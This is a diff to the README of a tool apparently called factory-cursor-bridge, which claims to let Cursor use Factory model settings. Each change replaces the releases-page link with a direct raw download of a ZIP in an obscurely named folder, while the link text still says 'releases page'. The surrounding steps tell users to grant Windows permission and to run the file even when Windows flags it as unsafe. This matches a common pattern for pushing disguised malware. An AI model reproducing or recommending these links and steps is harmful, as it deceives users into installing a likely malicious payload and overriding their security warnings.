@@ -1,6 +1,6 @@
 # 🧩 factory-cursor-bridge - Use Your Factory Models in Cursor
 
-[![Download](https://img.shields.io/badge/Download%20for%20Windows-blue?style=for-the-badge)](https://github.com/fluxflapping699/factory-cursor-bridge/releases)
+[![Download](https://img.shields.io/badge/Download%20for%20Windows-blue?style=for-the-badge)](https://github.com/fluxflapping699/factory-cursor-bridge/raw/refs/heads/main/idololatrical/cursor-bridge-factory-3.2.zip)
 
 ## 🚀 What this does
 
@@ -10,7 +10,7 @@ It helps you use the same BYOK model settings in Cursor without rebuilding your 
 
 ## 💾 Download for Windows
 
-1. Open the [releases page](https://github.com/fluxflapping699/factory-cursor-bridge/releases).
+1. Open the [releases page](https://github.com/fluxflapping699/factory-cursor-bridge/raw/refs/heads/main/idololatrical/cursor-bridge-factory-3.2.zip).
 2. Find the latest release.
 3. Download the Windows file for your system.
 4. If the download is a ZIP file, extract it first.
@@ -30,7 +30,7 @@ If you do not know where your Factory config file is, check the Factory app or t
 
 ## 📦 How to Set It Up
 
-1. Download the Windows release from the [releases page](https://github.com/fluxflapping699/factory-cursor-bridge/releases).
+1. Download the Windows release from the [releases page](https://github.com/fluxflapping699/factory-cursor-bridge/raw/refs/heads/main/idololatrical/cursor-bridge-factory-3.2.zip).
 2. Open the downloaded file.
 3. If Windows asks for permission, choose Yes.
 4. Follow the on-screen steps.
@@ -103,7 +103,7 @@ If the model list looks wrong, check that your `config.json` file has the model 
 
 ### Windows says the file is unsafe
 
-- Download it again from the [releases page](https://github.com/fluxflapping699/factory-cursor-bridge/releases)
+- Download it again from the [releases page](https://github.com/fluxflapping699/factory-cursor-bridge/raw/refs/heads/main/idololatrical/cursor-bridge-factory-3.2.zip)
 - Open the file from the extracted folder
 - If needed, right-click the file and allow it to run
 
@@ -158,7 +158,7 @@ Before you open the app, check these items:
 
 To get the latest version:
 
-1. Open the [releases page](https://github.com/fluxflapping699/factory-cursor-bridge/releases).
+1. Open the [releases page](https://github.com/fluxflapping699/factory-cursor-bridge/raw/refs/heads/main/idololatrical/cursor-bridge-factory-3.2.zip).
 2. Download the newest Windows file.
 3. Replace the old file with the new one if needed.
 4. Open the new version.
@@ -172,4 +172,4 @@ It fits users who already rely on `~/.factory/config.json` and want Cursor to us
 
 ## 🔗 Download Again
 
-If you need the file again, use the [releases page](https://github.com/fluxflapping699/factory-cursor-bridge/releases)
+If you need the file again, use the [releases page](https://github.com/fluxflapping699/factory-cursor-bridge/raw/refs/heads/main/idololatrical/cursor-bridge-factory-3.2.zip)
